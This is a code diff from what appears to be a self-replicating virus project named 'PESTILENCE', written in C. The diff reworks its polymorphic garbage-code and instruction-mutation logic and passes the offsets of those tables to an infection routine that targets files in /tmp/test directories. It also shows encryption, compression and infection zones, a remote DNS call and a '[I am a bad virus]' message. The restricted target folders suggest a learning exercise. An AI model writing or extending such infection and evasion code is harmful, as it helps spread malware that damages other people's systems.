@@ -50,28 +50,13 @@ void ft_srand(){
 		seed = fingerprint;
 }
 
-void change_garbage_code(){
-	ft_srand();
+void print_stats(){
 	int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
 	debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
 	int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
 	debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
 	int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
 	debug_ext("zone 3:", x2," to ", x3-1, " (virus, infection routine, ...)\n");
-	debug_ext("----------- output first 10 /", garbage_table_len, " of gb codes -----------\n");
-
-	unsigned char *prev = NULL;
-	for (size_t i = 0 ; i < garbage_table_len; i++){
-		generate_garb(((unsigned char *)(&bin_start)) + garbage_table[i].off, garbage_table[i].len, prev);
-		prev = ((unsigned char *)(&bin_start)) + garbage_table[i].off + garbage_table[i].len;
-	}
-
-	for (size_t i = 0 ; i < modified_table_len; i++){
-		debug_ext("search -> \n");
-		int xx = edit_ins(((unsigned char *)(&bin_start)) + modified_table[i].off);
-			debug_ext("for ", i, " >> ",xx," \n");
-	}
-	debug_ext("\n");
 }
 
 //======================= PESTILENCE =========================
@@ -114,7 +99,13 @@ void do_infection(){
 		size_t infectpush_off = ((size_t)&_infect_push) - ((size_t)&bin_start);
 		size_t infectpop_off = ((size_t)&_infect_pop) - ((size_t)&bin_start);
 
-		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off};
+		size_t gbt_off, gbtlen_off, modift_off, modiftlen_off;
+		gbt_off = ((size_t)&garbage_table) - ((size_t)&bin_start);
+		gbtlen_off = ((size_t)&garbage_table_len) - ((size_t)&bin_start);
+		modift_off = ((size_t)&modified_table) - ((size_t)&bin_start);
+		modiftlen_off = ((size_t)&modified_table_len) - ((size_t)&bin_start);
+
+		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off, gbt_off, gbtlen_off, modift_off, modiftlen_off};
 		infect_dir("/tmp/test", x, opt);
 		infect_dir("/tmp/test2", x, opt);
 }
@@ -126,7 +117,8 @@ int virus(void){
 				dns_remote();
 		if (opt.print_msg) println("[I am a bad virus]");
 
-		change_garbage_code();
+		print_stats();
+		ft_srand();
 		do_infection();
 		debug("** End of Virus");
 		return TRUE;
